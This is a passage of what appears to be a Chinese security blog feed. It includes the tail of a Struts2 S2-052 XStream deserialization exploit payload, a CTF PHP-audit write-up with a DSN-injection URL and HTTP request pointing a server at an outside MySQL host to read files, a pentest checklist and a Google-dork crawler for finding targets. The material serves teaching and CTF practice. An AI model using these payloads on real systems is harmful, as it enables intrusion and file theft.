class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1><span id="漏洞利用">漏洞利用</span></h1><p><img src="show.png" alt></p><p>需要更改Content-Type类型为application/xml</p><p><img src="avil.png" alt></p><h1><span id="拓展">拓展</span></h1><p>struts 重要漏洞列表，S2-003、S2-005、S2-007、S2-008、S2-009、S2-012、S2-013、S2-015、S2-016、S2-019、S2-029、S2-032、S2-033、S2-037、S2-045、S2-046、S2-048、S2-052。<br>虽然上述漏洞那么多，但是其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，造成远程代码执行。可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;漏洞编号  CVE-2017-9805(S2-052)&lt;br&gt;影响版本  Struts 2.5 - Struts 2.5.12, Struts 2.3.x&lt;br&gt;漏洞概述  问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反序列化转换成对象时，导致任意代码执行漏洞。&lt;br&gt;漏洞原理  跟上那些注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。&lt;/p&gt;
    
    </summary>
    
      <category term="攻防渗透" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="struts2" scheme="http://yoursite.com/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>记观安杯一道PHP审计</title>
    <link href="http://yoursite.com/2017/09/10/%E8%AE%B0%E8%A7%82%E5%AE%89%E6%9D%AF%E4%B8%80%E9%81%93PHP%E5%AE%A1%E8%AE%A1/"/>
    <id>http://yoursite.com/2017/09/10/记观安杯一道PHP审计/</id>
    <published>2017-09-10T05:56:07.000Z</published>
    <updated>2017-10-31T06:47:03.108Z</updated>
    
    <content type="html"><![CDATA[<p>2017 ISG“观安杯”管理运维赛一道PHP审计题,任意文件读取</p><h1><span id="逻辑步骤">逻辑步骤</span></h1><ol><li>通过robots文件泄漏的信息下载源码</li><li>通过审计PHP源码，发现dsn参数有问题：可以控制其连接端口，从而控制img.php中读取的文件</li><li>根据源码中提供的sql文件创建数据库后使用户头像的值为../server/flag，然后构造payload:http：//202.120.7.2x.7242//app.php?action=img&amp;dsn=wmwcms;host=116.196.91.18x</li><li>最后远程链接数据库拿到flag</li></ol><h1><span id="审计过程">审计过程</span></h1><a id="more"></a><p>源码的目录结构如下：<br><img src="sch.png" alt><br>前台，主文件app.php，由action可知，可跳转的是login  logout img<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    session_start();</span><br><span class="line">    define(<span class="string">'APP_PATH'</span>, dirname(dirname(<span class="keyword">__FILE__</span>)) . <span class="string">'/server/'</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'sql.php'</span>;</span><br><span class="line">    <span class="keyword">include_once</span> APP_PATH . <span class="string">'func.php'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"action"</span>])) &#123;</span><br><span class="line">        errormsg(<span class="string">"action is required."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $actions = [<span class="string">"login"</span>, <span class="string">"logout"</span>, <span class="string">"img"</span>];</span><br><span class="line">    <span class="keyword">if</span> (!in_array($_GET[<span class="string">"action"</span>], $actions)) &#123;</span><br><span class="line">        errormsg(<span class="string">'Hacking attempt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span> APP_PATH . $_GET[<span class="string">"action"</span>] . <span class="string">".php"</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟踪img.php,此源码文件包含了sql.php, 作为数据库连接，同时，根据判断去取portrait的值，并且最后引用了file_get_contents($portrait)作为输出，通过源码看到的flag文件在server目录下，所以要想办法读取server目录下的flag文件； 默认的数据库表里面的portrait的值为img/user.png，更改他为../server/flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'sql.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'uid'</span>])) &#123;</span><br><span class="line">    $portrait = <span class="string">"img/user.png"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $uid = intval($_SESSION[<span class="string">'uid'</span>]);</span><br><span class="line">    $sql = <span class="string">"select portrait from user where id = ?"</span>;</span><br><span class="line">    $sth = $dbh-&gt;prepare($sql);</span><br><span class="line">    $sth-&gt;execute([$uid]);</span><br><span class="line">    $user = $sth-&gt;fetchAll();</span><br><span class="line">    <span class="keyword">if</span>(count($user) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $user = $user[<span class="number">0</span>];</span><br><span class="line">        $portrait = $user[<span class="string">"portrait"</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $portrait = <span class="string">"img/user.png"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">"Cache-Control: max-age=1, s-maxage=1, no-cache, must-revalidate"</span>);</span><br><span class="line">header(<span class="string">"Content-type: image/png;charset=gb2312"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($portrait);</span><br></pre></td></tr></table></figure></p><p>回溯sql.php源码文件，关键函数$dsn<br>$dsn = “mysql:dbname={$dsn}”;<br>构造dsn的值，最终可以变化为$dsn=”mysql:dbname=wmwcms;host=x.x.x.x”<br>完美构造PDO<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'func.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'dsn'</span>]))&#123;</span><br><span class="line">    $dsn = $_REQUEST[<span class="string">'dsn'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    $dsn = <span class="string">"wmwcms"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$dsn = <span class="string">"mysql:dbname=&#123;$dsn&#125;"</span>;</span><br><span class="line">$username = <span class="string">'wmwcms'</span>;</span><br><span class="line">$password = <span class="string">'%glVYKTkLtQ22'</span>;</span><br><span class="line">$options = <span class="keyword">array</span>(</span><br><span class="line">    PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'SET names utf8'</span>,</span><br><span class="line">    );</span><br><span class="line">$dbh = <span class="keyword">new</span> PDO($dsn, $username, $password, $options);</span><br></pre></td></tr></table></figure></p><p>构造对应的payload<br>/app.php?action=img&amp;dsn=wmwcms;host=116.196.91.18x<br>ps:当然自己远程的mysql数据库的用户名密码是sql.php内写死的口令，按照sql.php内帐号进行创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /app.php?action=img&amp;dsn=wmwcms;host=116.196.91.18x HTTP/1.1</span><br><span class="line">Host: 202.120.7.204:7242</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=g5k5rsm0c5vlbmlg11afv27g64</span><br><span class="line">If-None-Match: &quot;5a9-5574e78e6a3c0-gzip&quot;</span><br><span class="line">If-Modified-Since: Tue, 22 Aug 2017 02:37:11 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>官方参考<br><a href="http://php.net/manual/zh/ref.pdo-mysql.connection.php" target="_blank" rel="noopener">http://php.net/manual/zh/ref.pdo-mysql.connection.php</a><br><img src="cankao.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2017 ISG“观安杯”管理运维赛一道PHP审计题,任意文件读取&lt;/p&gt;
&lt;h1 id=&quot;逻辑步骤&quot;&gt;&lt;a href=&quot;#逻辑步骤&quot; class=&quot;headerlink&quot; title=&quot;逻辑步骤&quot;&gt;&lt;/a&gt;逻辑步骤&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;通过robots文件泄漏的信息下载源码&lt;/li&gt;
&lt;li&gt;通过审计PHP源码，发现dsn参数有问题：可以控制其连接端口，从而控制img.php中读取的文件&lt;/li&gt;
&lt;li&gt;根据源码中提供的sql文件创建数据库后使用户头像的值为../server/flag，然后构造payload:http：//202.120.7.2x.7242//app.php?action=img&amp;amp;dsn=wmwcms;host=116.196.91.18x&lt;/li&gt;
&lt;li&gt;最后远程链接数据库拿到flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;审计过程&quot;&gt;&lt;a href=&quot;#审计过程&quot; class=&quot;headerlink&quot; title=&quot;审计过程&quot;&gt;&lt;/a&gt;审计过程&lt;/h1&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试</title>
    <link href="http://yoursite.com/2017/09/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2017/09/08/渗透测试/</id>
    <published>2017-09-08T08:47:41.000Z</published>
    <updated>2019-02-16T10:30:08.640Z</updated>
    
    <content type="html"><![CDATA[<p>渗透测试框架图&amp;黑盒漏洞功能点挖洞</p><p>渗透框架图如下<br><a id="more"></a><br><img src="pentest.png" alt></p><p>黑盒渗透功能点维度碎碎念<br>sm0nk原创，原文首发t00ls，<a href="https://www.t00ls.net/thread-35614-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-35614-1-1.html</a></p><ol><li><p>概要说明<br>白盒审计固然重要，黑盒渗透是*帽子经常的工作or研究对象。<br>本帖从功能点维度去分析，在前/后台看到什么样的功能时，我们就应该想到可能什么漏洞，有了这个规则+已有POC&amp;EXP的积累，就可多维度建模关联分析，写漏扫、写自动化等<br>建立已有经验的基础，不足之处欢迎各大牛指正，同时也欢迎补充，也好进一步完善。<br><img src="totalrev.png" alt></p></li><li><p>功能点维度-前台<br>随着安全的强化，现在安全如下规律<br>1). 大站基本都有安全措施，中小站也会有对应的安全措施。如果沿用教科书上的漏扫（AWVS Nessus）挖洞 ;即使长的帅也得考虑是否让父母给买个媳妇。<br>2). 信息泄漏成为重灾区，比如空间引擎的信息、弱文件/测试文件（跟程序员比细心）、代码托管的泄漏等等，前期的信息收集的多少决定后续渗透的深度和广度<br>3). 使用框架的安全性，已有插件的漏洞（乌云搜一下）、新爆漏洞的应急（比如又出来S2）<br>4). 口令问题，虽然看上去很弱智，但试想一个大企业，统一去更改个123456 从各协议各用户各应用等角度，还真不是说句话就能搞定。我们平常搞个注入，如果加密的那段密文cmd查不出，又有几个真花大力气破解？仍归类到弱口令<br>5). 系统补丁问题，貌似不是提权的漏洞不是好漏洞，提权仍基于系统漏洞。<br>6). 关于编程语言特性，PHP就找开源程序&amp;敏感函数及类似处理，java的一些框架都比较成熟了，比如hibernate，如果配置拼接没啥问题找个注入太难，但针对java 越权类的漏洞比较多。<br> PS1：虽然都说PHP是世界最好的语言，但大企业中，还是用jsp+oracle 比较多， 因为jsp类中间件有维保啊，很难像facebook这公司对php搞的特别透，快速响应任何问题。（猪猪侠的SSRF说一个影响有钱人的漏洞就是weblogic 的案例比较多）<br> PS2：跟程序员和运维人员拼的是耐心和细心，当然运气也是实力的一部分</p></li><li><p>功能点维度-后台<br>关于后台，规律如下：<br>1). 注册登录一直研究的关键点，因为有个登录体系是灵魂，曾几度，公司专门设置认证登录体系岗位，详情参考招聘网站；<br>2). 逻辑安全尤为重要，毕竟扫描器不好来实现，比如1元购、订单篡改、羊毛党等等，后续研究自动化的重要趋势；<br>3). 上传功能超级敏感，webshell 大多跟上传有关，甚至大多跟后台上传功能有关<br><img src="part1.png" alt><br><img src="part2.png" alt></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;渗透测试框架图&amp;amp;黑盒漏洞功能点挖洞&lt;/p&gt;
&lt;p&gt;渗透框架图如下&lt;br&gt;
    
    </summary>
    
      <category term="攻防渗透" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="pentest" scheme="http://yoursite.com/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>百度爬虫</title>
    <link href="http://yoursite.com/2017/09/08/%E7%99%BE%E5%BA%A6%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2017/09/08/百度爬虫/</id>
    <published>2017-09-08T08:00:46.000Z</published>
    <updated>2017-09-08T09:21:25.750Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="1-目的">1. 目的</span></h1><p>使用爬虫脚本 爬去 百度搜索关键字后获得r链接地址以及域名信息<br>可结合GHDB语法<br>e.g.  inurl:php?id=<br><a id="more"></a></p><h1><span id="2-知识结构">2. 知识结构</span></h1><p>2.1 使用 threading &amp; queue 模块，多线程处理，自定义线程数<br>2.2 使用BeautifulSoup &amp; re模块，处理href 匹配<br>2.3 使用requests 模块，处理web请求&amp;获得请求后的真实地址（r.url）<br>2.4 百度最大搜索页面76页，pn max 760<br>2.5 将结果存入文本，域名已去重</p><h1><span id="3-爬虫脚本">3. 爬虫脚本</span></h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"><span class="keyword">import</span> os,sys,time</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaiduSpider</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self._queue = queue</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            url = self._queue.get_nowait()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment">#print url</span></span><br><span class="line">                self.spider(url)</span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                <span class="keyword">print</span> e</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(self,url)</span>:</span></span><br><span class="line">    <span class="comment">#if not add self , error:takes exactly 1 argument (2 given)    </span></span><br><span class="line">        r = requests.get(url=url,headers=headers)</span><br><span class="line">        soup = bs(r.content,<span class="string">'lxml'</span>)</span><br><span class="line">        urls = soup.find_all(name=<span class="string">'a'</span>,attrs=&#123;<span class="string">'data-click'</span>:re.compile((<span class="string">'.'</span>)),<span class="string">'class'</span>:<span class="keyword">None</span>&#125;)</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">            <span class="comment">#print url['href']</span></span><br><span class="line">            new_r = requests.get(url=url[<span class="string">'href'</span>],headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> new_r.status_code == <span class="number">200</span> :</span><br><span class="line">                url_para = new_r.url</span><br><span class="line">                url_index_tmp = url_para.split(<span class="string">'/'</span>)</span><br><span class="line">                url_index = url_index_tmp[<span class="number">0</span>]+<span class="string">'//'</span>+url_index_tmp[<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">print</span> url_para+<span class="string">'\n'</span>+url_index</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'url_para.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">                    f1.write(url_para+<span class="string">'\n'</span>)</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'url_index.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">'url_index.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f3:</span><br><span class="line">                        <span class="keyword">if</span> url_index <span class="keyword">not</span> <span class="keyword">in</span> f3.read():</span><br><span class="line">                            f2.write(url_index+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'no access'</span>,url[<span class="string">'href'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(keyword)</span>:</span></span><br><span class="line">    queue = Queue.Queue()</span><br><span class="line">    de_keyword = keyword.decode(sys.stdin.encoding).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> keyword</span><br><span class="line">    <span class="comment"># baidu max pages 76 , so pn=750 max</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">760</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#queue.put('https://www.baidu.com/s?ie=utf-8&amp;wd=%s&amp;pn=%d'%(keyword,i))</span></span><br><span class="line">        queue.put(<span class="string">'https://www.baidu.com/s?ie=utf-8&amp;wd=%s&amp;pn=%d'</span>%(de_keyword,i))</span><br><span class="line">    threads = []</span><br><span class="line">    thread_count = <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_count):</span><br><span class="line">        threads.append(BaiduSpider(queue))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Enter:%s keyword'</span>%sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>效果图<br><img src="1.jpg" alt></p><h1><span id="4-待优化点">4. 待优化点</span></h1><p>4.1 多个搜索引擎的处理<br>4.2 多参数的处理<br>4.2 payload 结合</p><h1><span id="5-参考信息">5. 参考信息</span></h1><p>5.1. ADO ichunqiu Python安全工具开发应用<br>5.2. <a href="https://github.com/sharpdeep/CrawlerBaidu/blob/master/CrawlerBaidu.py" target="_blank" rel="noopener">https://github.com/sharpdeep/CrawlerBaidu/blob/master/CrawlerBaidu.py</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-目的&quot;&gt;&lt;a href=&quot;#1-目的&quot; class=&quot;headerlink&quot; title=&quot;1. 目的&quot;&gt;&lt;/a&gt;1. 目的&lt;/h1&gt;&lt;p&gt;使用爬虫脚本 爬去 百度搜索关键字后获得r链接地址以及域名信息&lt;br&gt;可结合GHDB语法&lt;br&gt;e.g.  inurl:php?id=&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>安全应急</title>
    <link href="http://yoursite.com/2017/09/08/%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5/"/>
    <id>http://yoursite.com/2017/09/08/安全应急/</id>
    <published>2017-09-08T07:55:15.000Z</published>
    <updated>2017-10-17T10:16:08.249Z</updated>
    
    <content type="html"><![CDATA[<p>目录<br>黑客入侵应急分析手工排查    1<br>1    事件分类    3<br>2    排查思路    3<br>3    分析排查    4<br>3.1    Linux系列分析排查    4<br><a id="more"></a><br>3.1.1    文件分析    4<br>3.1.2    进程命令    5<br>3.1.3    系统信息    7<br>3.1.4    后门排查    9<br>3.1.5    日志分析    12<br>3.1.6    相关处置    14<br>3.2    Windows系列分析排查    14<br>3.2.1    文件分析    14<br>3.2.2    进程命令    15<br>3.2.3    系统信息    16<br>3.2.4    后门排查    17<br>3.2.5    日志分析    19<br>3.2.6    相关处置    23<br>3.3    应用类    23<br>4    应急总结    24<br>5    渗透反辅    25<br>6    资源参考    26<br>7    FAQ    27<br><img src="secema.png" alt></p><p>sm0nk原创作品，原文首发先知<br><a href="https://xianzhi.aliyun.com/forum/read/1655.html" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/read/1655.html</a></p><p>自己的cnblogs链接，黑客入侵应急分析手工排查<br><a href="http://www.cnblogs.com/shellr00t/p/6943796.html" target="_blank" rel="noopener">http://www.cnblogs.com/shellr00t/p/6943796.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目录&lt;br&gt;黑客入侵应急分析手工排查    1&lt;br&gt;1    事件分类    3&lt;br&gt;2    排查思路    3&lt;br&gt;3    分析排查    4&lt;br&gt;3.1    Linux系列分析排查    4&lt;br&gt;
    
    </summary>
    
      <category term="归纳总结" scheme="http://yoursite.com/categories/%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="应急" scheme="http://yoursite.com/tags/%E5%BA%94%E6%80%A5/"/>
    
  </entry>
  
  <entry>
    <title>朝花夕拾</title>
    <link href="http://yoursite.com/2017/08/18/%E6%9C%9D%E8%8A%B1%E5%A4%95%E6%8B%BE/"/>
    <id>http://yoursite.com/2017/08/18/朝花夕拾/</id>
    <published>2017-08-18T00:08:08.000Z</published>
    <updated>2017-10-18T02:05:01.432Z</updated>
    
    <content type="html"><![CDATA[<p>个人博客，朝花夕拾。<br>索引链接。<br>新浪博客：<a href="http://blog.sina.com.cn/shellr00t" target="_blank" rel="noopener">http://blog.sina.com.cn/shellr00t</a><br>Cnblogs：<a href="http://www.cnblogs.com/shellr00t" target="_blank" rel="noopener">http://www.cnblogs.com/shellr00t</a><br><a id="more"></a></p><p>新浪博客主要博文分类<br>Web安全<br>渗透攻防<br>安全开发<br>数据仓库<br>操作系统<br>网络知识<br>移动安全<br>建模分析<br>项目管理<br>金庸赏析<br>精品阅读<br>扫地打杂<br>喝点鸡汤<br>专业扯淡<br><img src="sinablog.png" alt></p><p>Cnblogs博客博文分类<br>SQL注入<br>代码审计<br>归纳总结<br>脚本开发<br>精品阅读<br>漏洞总结<br>神兵利器<br>渗透测试<br><img src="cnblogs.png" alt></p>]]></content>
    
    <summary type="html">
    
